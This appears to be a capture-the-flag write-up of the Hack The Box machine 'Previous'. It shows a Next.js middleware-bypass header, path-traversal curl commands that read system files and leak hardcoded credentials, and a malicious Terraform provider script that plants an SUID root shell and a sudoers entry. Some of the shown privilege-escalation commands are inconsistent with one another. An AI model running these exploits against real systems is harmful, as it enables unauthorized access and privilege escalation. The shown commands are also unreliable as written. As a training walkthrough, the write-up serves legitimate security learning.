---
layout: post
title: "[HTB] Previous"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---

![](/img/htb_img/Previous_img/img1.png)

- OS: Linux
- Release Date: 23 Aug 2025
- Difficulty: Medium

<br>

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 15:47 CEST
Initiating SYN Stealth Scan at 15:47
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.129.xx.xx
Discovered open port 80/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 15:47, 12.71s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.044s latency).
Scanned at 2025-08-24 15:47:37 CEST for 13s
Not shown: 62865 closed tcp ports (reset), 2668 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds
           Raw packets sent: 69122 (3.041MB) | Rcvd: 63062 (2.522MB)
```

Scripts and versions.
```
❯ extractPorts allports

[*] Extracting information...

	[*] IP Address: 10.129.xx.xx
	[*] Open ports: 22,80

[*] Ports copied to clipboard

❯ nmap -p22,80 -sCV -Pn -oN targeted $target       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 15:56 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```

- SSH service running on TCP Port 22
- HTTP service running on TCP Port 80 (Nginx with Ubuntu codename).
- A domain name has appeared `previous.htb`.

```
❯ echo "$target previous.htb" | sudo tee -a /etc/hosts  
10.129.xx.xx previous.htb
```

## TCP 80 - HTTP Web server
![](/img/htb_img/Previous_img/img2.png)

```
❯ whatweb http://previous.htb
http://previous.htb [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.xx.xx], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
```
It's running Next.js.
A CVE exists in Next.js depending on the version and configuration, involving middleware bypass.
https://github.com/alihussainzada/CVE-2025-29927-PoC/tree/main
---

# Foothold
Exploring the PoC of this CVE we can read the following:

> [!NOTE] PoC
> We can greatly simplify the exploitation of this issue by using a polyglot that lets us effectively cover the various potential cases. We were able to achieve this with the following HTTP header, used to check for the presence of an authentication bypass:
```
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
```

Brute-forcing the API endpoints, we find:
```
❯ dirsearch -u http://previous.htb/api/ \
-w /usr/share/wordlists/dirb/common.txt \
-H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware"
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /home/kali/HTB/Machines/Previous/nmap/reports/http_previous.htb/_api__25-08-24_18-45-02.txt

Target: http://previous.htb/

[18:45:02] Starting: api/
[18:45:08] 400 -   28B  - /api/download
```


> [!NOTE] Info
> The `/api/download` endpoint is designed to let users download a file by passing its name through the example parameter. 
> However, the application **does not** properly sanitize or restrict this parameter.
> As a result, an attacker can abuse it with directory traversal sequences ( ../ ) to break out of the intended folder and read sensitive system files (e.g., /proc/self/environ, /app/server.js ). This effectively turns the endpoint into a Local File Inclusion ( LFI ) vulnerability, exposing environment variables, source code, and other critical data.

Curling with the path traversal:
```
❯ curl -s "http://previous.htb/api/download?example=../../../../../../etc/passwd" -H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware" | tr '\0' '\n'

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologinç
```

To check the environmental variables:
```
❯ curl -s "http://previous.htb/api/download?example=../../../../../../proc/self/environ" -H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware" | tr '\0' '\n'

NODE_VERSION=18.20.8
HOSTNAME=0.0.0.0
YARN_VERSION=1.22.22
SHLVL=1
PORT=3000
HOME=/home/nextjs
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NEXT_TELEMETRY_DISABLED=1
PWD=/app
NODE_ENV=production
```
---

Knowing the working directory is `/app`, we can try to read the server configuration.
```
❯ curl -s "http://previous.htb/api/download?example=../../../../../../app/server.js" -H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware" | tr '\0' '\n'
const path = require('path')

const dir = path.join(__dirname)

process.env.NODE_ENV = 'production'
process.chdir(__dirname)

const currentPort = parseInt(process.env.PORT, 10) || 3000
const hostname = process.env.HOSTNAME || '0.0.0.0'

let keepAliveTimeout = parseInt(process.env.KEEP_ALIVE_TIMEOUT, 10)
const nextConfig = {"env":{},"eslint":{"ignoreDuringBuilds":false},"typescript":{"ignoreBuildErrors":false,"tsconfigPath":"tsconfig.json"},"distDir":"./.next","cleanDistDir":true,"assetPrefix":"","cacheMaxMemorySize":52428800,"configOrigin":"next.config.mjs","useFileSystemPublicRoutes":true,"generateEtags":true,"pageExtensions":["js","jsx","md","mdx","ts","tsx"],"poweredByHeader":true,"compress":true,"images":{"deviceSizes":[640,750,828,1080,1200,1920,2048,3840],"imageSizes":[16,32,48,64,96,128,256,384],"path":"/_next/image","loader":"default","loaderFile":"","domains":[],"disableStaticImages":false,"minimumCacheTTL":60,"formats":["image/webp"],"dangerouslyAllowSVG":false,"contentSecurityPolicy":"script-src 'none'; frame-src 'none'; sandbox;","contentDispositionType":"attachment","remotePatterns":[],"unoptimized":false},"devIndicators":{"position":"bottom-left"},"onDemandEntries":{"maxInactiveAge":60000,"pagesBufferLength":5},"amp":{"canonicalBase":""},"basePath":"","sassOptions":{},"trailingSlash":false,"i18n":null,"productionBrowserSourceMaps":false,"excludeDefaultMomentLocales":true,"serverRuntimeConfig":{},"publicRuntimeConfig":{},"reactProductionProfiling":false,"reactStrictMode":null,"reactMaxHeadersLength":6000,"httpAgentOptions":{"keepAlive":true},"logging":{},"expireTime":31536000,"staticPageGenerationTimeout":60,"output":"standalone","modularizeImports":{"@mui/icons-material":{"transform":"@mui/icons-material/{{member}}"},"lodash":{"transform":"lodash/{{member}}"}},"outputFileTracingRoot":"/app","experimental":{"allowedDevOrigins":[],"nodeMiddleware":false,"cacheLife":{"default":{"stale":300,"revalidate":900,"expire":4294967294},"seconds":{"stale":0,"revalidate":1,"expire":60},"minutes":{"stale":300,"revalidate":60,"expire":3600},"hours":{"stale":300,"revalidate":3600,"expire":86400},"days":{"stale":300,"revalidate":86400,"expire":604800},"weeks":{"stale":300,"revalidate":604800,"expire":2592000},"max":{"stale":300,"revalidate":2592000,"expire":4294967294}},"cacheHandlers":{},"cssChunking":true,"multiZoneDraftMode":false,"appNavFailHandling":false,"prerenderEarlyExit":true,"serverMinification":true,"serverSourceMaps":false,"linkNoTouchStart":false,"caseSensitiveRoutes":false,"clientSegmentCache":false,"preloadEntriesOnStart":true,"clientRouterFilter":true,"clientRouterFilterRedirects":false,"fetchCacheKeyPrefix":"","middlewarePrefetch":"flexible","optimisticClientCache":true,"manualClientBasePath":false,"cpus":1,"memoryBasedWorkersCount":false,"imgOptConcurrency":null,"imgOptTimeoutInSeconds":7,"imgOptMaxInputPixels":268402689,"imgOptSequentialRead":null,"isrFlushToDisk":true,"workerThreads":false,"optimizeCss":false,"nextScriptWorkers":false,"scrollRestoration":false,"externalDir":false,"disableOptimizedLoading":false,"gzipSize":true,"craCompat":false,"esmExternals":true,"fullySpecified":false,"swcTraceProfiling":false,"forceSwcTransforms":false,"largePageDataBytes":128000,"turbo":{"root":"/app"},"typedRoutes":false,"typedEnv":false,"parallelServerCompiles":false,"parallelServerBuildTraces":false,"ppr":false,"authInterrupts":false,"webpackMemoryOptimizations":false,"optimizeServerReact":true,"useEarlyImport":false,"viewTransition":false,"staleTimes":{"dynamic":0,"static":300},"serverComponentsHmrCache":true,"staticGenerationMaxConcurrency":8,"staticGenerationMinPagesPerWorker":25,"dynamicIO":false,"inlineCss":false,"useCache":false,"optimizePackageImports":["lucide-react","date-fns","lodash-es","ramda","antd","react-bootstrap","ahooks","@ant-design/icons","@headlessui/react","@headlessui-float/react","@heroicons/react/20/solid","@heroicons/react/24/solid","@heroicons/react/24/outline","@visx/visx","@tremor/react","rxjs","@mui/material","@mui/icons-material","recharts","react-use","effect","@effect/schema","@effect/platform","@effect/platform-node","@effect/platform-browser","@effect/platform-bun","@effect/sql","@effect/sql-mssql","@effect/sql-mysql2","@effect/sql-pg","@effect/sql-squlite-node","@effect/sql-squlite-bun","@effect/sql-squlite-wasm","@effect/sql-squlite-react-native","@effect/rpc","@effect/rpc-http","@effect/typeclass","@effect/experimental","@effect/opentelemetry","@material-ui/core","@material-ui/icons","@tabler/icons-react","mui-core","react-icons/ai","react-icons/bi","react-icons/bs","react-icons/cg","react-icons/ci","react-icons/di","react-icons/fa","react-icons/fa6","react-icons/fc","react-icons/fi","react-icons/gi","react-icons/go","react-icons/gr","react-icons/hi","react-icons/hi2","react-icons/im","react-icons/io","react-icons/io5","react-icons/lia","react-icons/lib","react-icons/lu","react-icons/md","react-icons/pi","react-icons/ri","react-icons/rx","react-icons/si","react-icons/sl","react-icons/tb","react-icons/tfi","react-icons/ti","react-icons/vsc","react-icons/wi"],"trustHostHeader":false,"isExperimentalCompile":false},"htmlLimitedBots":"Mediapartners-Google|Slurp|DuckDuckBot|baiduspider|yandex|sogou|bitlybot|tumblr|vkShare|quora link preview|redditbot|ia_archiver|Bingbot|BingPreview|applebot|facebookexternalhit|facebookcatalog|Twitterbot|LinkedInBot|Slackbot|Discordbot|WhatsApp|SkypeUriPreview","bundlePagesRouterDependencies":false,"configFileName":"next.config.mjs"}

process.env.__NEXT_PRIVATE_STANDALONE_CONFIG = JSON.stringify(nextConfig)

require('next')
const { startServer } = require('next/dist/server/lib/start-server')

if (
  Number.isNaN(keepAliveTimeout) ||
  !Number.isFinite(keepAliveTimeout) ||
  keepAliveTimeout < 0
) {
  keepAliveTimeout = undefined
}

startServer({
  dir,
  isDev: false,
  config: nextConfig,
  hostname,
  port: currentPort,
  allowRetry: false,
  keepAliveTimeout,
}).catch((err) => {
  console.error(err);
  process.exit(1);
});%
```
---

Routing configuration:
```
❯ curl -s "http://previous.htb/api/download?example=../../../../../../app/.next/routes-manifest.json" -H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware" | tr '\0' '\n'
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}%                                                 
```

NextAuth API file:
```
❯ curl -s "http://previous.htb/api/download?example=../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware" | tr '\0' '\n'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();%
```

Here we have a secret username and password revealed:

> [!NOTE] Credentials
> jeremy / MyNameIsJeremyAndILovePancakes

---

## Exploit Summary

> [!NOTE] 📝 Exploit Summary – Previous (HTB)
> We identified that the target was running Next.js and discovered a vulnerable endpoint /api/download. This endpoint allowed path traversal, enabling us to read sensitive files from the server. 
> First, we leaked the environment variables, confirming the application ran in production under /app.
> Next, we accessed the server configuration file and the Next.js routing manifest, which revealed hidden dynamic routes. Among these, we found the NextAuth authentication route and managed to download its compiled source file.
> The file contained the authentication logic, which hardcoded a fallback credential for the user jeremy.
> With this knowledge, we successfully authenticated as jeremy and gained access to the system.

## SSH Log in as jeremy
```
❯ ssh jeremy@10.129.xx.xx
jeremy@10.129.xx.xx's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug 24 05:04:59 PM UTC 2025

  System load:  0.74              Processes:             219
  Usage of /:   80.1% of 8.76GB   Users logged in:       1
  Memory usage: 13%               IPv4 address for eth0: 10.129.xx.xx
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


-bash-5.1$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
-bash-5.1$
```

### User flag
```
-bash-5.1$ cat user.txt 
<REDACTED>
```
---
# Privilege Escalation
Privilege checking:
```
-bash-5.1$ sudo -l
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

## Exploring the examples directory
```
-bash-5.1$ cd /opt/examples/

-bash-5.1$ ls -lah
total 28K
drwxr-xr-x 3 root root 4.0K Aug 24 17:07 .
drwxr-xr-x 5 root root 4.0K Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
drwxr-xr-x 3 root root 4.0K Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root 1.1K Aug 24 17:07 terraform.tfstate
```

## Terraform
The `main.tf` is a Terraform configuration file.

> [!NOTE]  **What is Terraform?**
> Terraform is an **Infrastructure as Code (IaC)** tool created by HashiCorp. 
> It lets you **define, provision, and manage infrastructure** (servers, networks, databases, load balancers, etc.) using text files instead of manually clicking around in a cloud console or running ad-hoc commands.
```
-bash-5.1$ cat main.tf 
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

## Exploring /opt
```
-bash-5.1$ ls -la /opt
total 20
drwxr-xr-x  5 root root 4096 Aug 21 20:09 .
drwxr-xr-x 18 root root 4096 Aug 21 20:23 ..
drwx--x--x  4 root root 4096 Aug 21 20:09 containerd
drwxr-xr-x  3 root root 4096 Aug 24 17:11 examples
drwxr-xr-x  3 root root 4096 Aug 21 20:09 terraform-provider-examples
```

We can create a malicious Terraform provider to hijack the execution.
### Malicious terraform file
```
-bash-5.1$ cat > /tmp/terraform-provider-examples << 'EOF'
> #!/bin/bash
> # Malicious provider script
> chmod +s /bin/bash
> cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash
> echo 'jeremy ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
> echo '{"malicious": "provider"}'
> EOF
```

This creates an SUID copy of bash in `/tmp` and appends a passwordless sudoers entry for jeremy.
```
-bash-5.1$ chmod +x /tmp/terraform-provider-examples 
-bash-5.1$ export TF_CLI_CONFIG_FILE=/tmp/terraform.rc
-bash-5.1$ cat > /tmp/terraform << 'EOF'
> provider_installlation {
>   dev_overrides {
>     "previous.htb/terraform/examples" = "/tmp"
>   }
>   direct {}
> }
> EOF
```

### Executing the exploit
```
-bash-5.1$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become
│ incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider
│ previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain schema:
│ Unrecognized remote plugin message: {"malicious": "provider"}
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
```

The errors are OK and we can check if the rootbash has been created.
```
-bash-5.1$ ls -la /tmp/rootbash 
-rwsr-sr-x 1 root root 1396520 Aug 24 17:02 /tmp/rootbash
-bash-5.1$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(jeremy) gid=1000(jeremy) euid=0(root) egid=0(root) groups=0(root),1000(jeremy)
```

### Root flag
And we retrieve the root flag.
```
rootbash-5.1# cat /root/root.txt
<REDACTED>
rootbash-5.1#
```